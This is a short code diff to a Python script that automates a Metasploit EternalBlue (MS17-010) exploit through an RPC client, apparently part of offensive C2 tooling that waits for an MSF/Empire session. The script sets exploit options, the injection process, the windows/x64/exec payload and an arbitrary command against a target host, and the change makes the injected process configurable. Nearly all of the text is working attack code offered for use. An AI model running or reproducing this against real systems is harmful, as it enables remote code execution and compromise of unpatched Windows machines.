@@ -6,7 +6,7 @@ Run this & then wait for a MSF/Empire session
 from c2_settings import MSF_SERVER, MSF_PWD
 from pymetasploit.msfrpc import MsfRpcClient
 
-def run(client, RHOST, CMD):
+def run(client, RHOST, CMD, Process='smss.exe'):
     """
     Launch EternalBlue on RHOST running CMD
     \n:param client: MsfRpcClient object
@@ -21,7 +21,7 @@ def run(client, RHOST, CMD):
     console.write('set GroomAllocations 12')
     console.write('set GroomDelta 5')
     console.write('set MaxExploitAttempts 2')
-    console.write('set Process smss.exe')
+    console.write('set Process {0}'.format(Process))
     console.write('set RHOST {0}'.format(RHOST))
     console.write('set PAYLOAD windows/x64/exec')
     console.write('set CMD {0}'.format(CMD))
